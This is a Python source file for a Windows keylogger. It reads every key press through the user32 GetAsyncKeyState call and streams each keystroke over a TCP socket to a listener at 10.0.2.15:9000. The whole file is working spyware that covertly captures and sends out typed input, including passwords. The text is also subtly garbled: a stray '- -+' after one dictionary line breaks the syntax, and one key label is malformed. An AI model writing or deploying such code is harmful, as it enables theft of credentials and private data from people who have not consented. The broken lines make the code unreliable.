import socket  # Socket for TCP communication
import ctypes  # For accessing Windows keyboard API
import time    # For sleep functionality

# Server IP and Port
serverAddress = ('10.0.2.15', 9000) 
 
# Create and connect socket
clientSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
clientSocket.connect(serverAddress)

# Load user32.dll for accessing Windows key state
user32 = ctypes.windll.user32

# Function to convert key code to readable format
def getKey(code):
    asciiTable = {
        "8": "[BACKSPACE]", "9": "[TAB]", "13": "[ENTER]", "16": "[SHIFT]",
        "17": "[CTRL]", "18": "[ALT]", "19": "[PAUSE]", "20": "[CAPSLOCK]",
        "27": "[ESC]", "32": " ", "33": "[PAGEUP]", "34": "[PAGEDOWN]",
        "35": "[END]", "36": "[HOME]", "37": "[LEFT]", "38": "[UP]",- -+
        "39": "[RIGHT]", "40": "[DOWN]", "45": "[INSERT]", "46": "[DELETE]",
        "48": "0", "49": "1", "50": "2", "51": "3", "52": "4", "53": "5",
        "54": "6", "55": "7", "56": "8", "57": "9", "65": "A", "66": "B",
        "67": "C", "68": "D", "69": "E", "70": "F", "71": "G", "72": "H",
        "73": "I", "74": "J", "75": "K", "76": "L", "77": "M", "78": "N",
        "79": "O", "80": "P", "81": "Q", "82": "R", "83": "S", "84": "T",
        "85": "U", "86": "V", "87": "W", "88": "X", "89": "Y", "90": "Z",
        "91": "[WIN]", "93": "[MENU]", "96": "0", "97": "1", "98": "2",
        "99": "3", "100": "4", "101": "5", "102": "6", "103": "7", "104": "8",
        "105": "9", "106": "*", "107": "+", "109": "-", "110": ".", "111": "/",
        "112": "[F1]", "113": "[F2]", "114": "[F3]", "115": "[F4]",
        "116": "[F5]", "117": "[F6]", "118": "[F7]", "119": "[F8]",
        "120": "[F9]", "121": "[F10]", "122": "[F11]", "123": "[F12-]",        "186": ";", "187": "=", "188": ",", "189": "-", "190": ".", 
        "191": "/", "192": "`", "219": "[", "220": "\\", "221": "]", 
        "222": "'"
    }

    return asciiTable.get(code, "")

# Main function for capturing keystrokes
def main():
    keyStates = {}

    while True:
        for i in range(256):
            if user32.GetAsyncKeyState(i) & 0x8000:
                if not keyStates.get(i, False):
                    keyStates[i] = True
                    key = getKey(str(i))

                    # If CapsLock is OFF and key is alphabetical, make it lowercase
                    if user32.GetKeyState(0x14) & 0x0001 == 0:
                        key = key.lower()

                    if key:
                        clientSocket.sendall(key.encode())
            else:
                keyStates[i] = False

        time.sleep(0.01)  # 10 ms pause

# Run main
if __name__ == "__main__":
    main()




